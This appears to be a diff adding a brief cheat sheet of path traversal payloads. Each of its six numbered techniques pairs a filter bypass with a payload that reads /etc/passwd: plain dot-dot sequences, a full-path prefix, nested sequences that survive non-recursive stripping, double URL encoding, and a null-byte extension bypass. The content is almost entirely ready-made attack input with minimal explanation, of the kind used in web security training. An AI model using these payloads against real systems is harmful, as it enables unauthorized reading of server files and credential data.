@@ -1,0 +1,19 @@
+Directory / Path / File Traversal 
+=====================================
+1. simple technique 
+../../../../../etc/passwd
+
+2. validation of start of path  # providing full path if the file is displaying the path (location of file /var/www/images)
+/var/www/images/../../../../../etc/passwd 
+
+3. blocked absolute (../) path technique
+/etc/passwd
+
+4. sequences stripped non-recursively technique  # server will remove ../ in request 
+....//....//....//....//....//etc/passwd
+
+5. sequences stripped with superfluous URL-decode technique   # server will remove ..// and also check single decode  
+..%252f..%252f..%252fetc/passwd    # its double encoded 
+
+6. validation of file extension with null byte (%00) bypass   # server will only allow .jpg/.pnf file extension 
+../../../../../etc/passwd%00.jpg
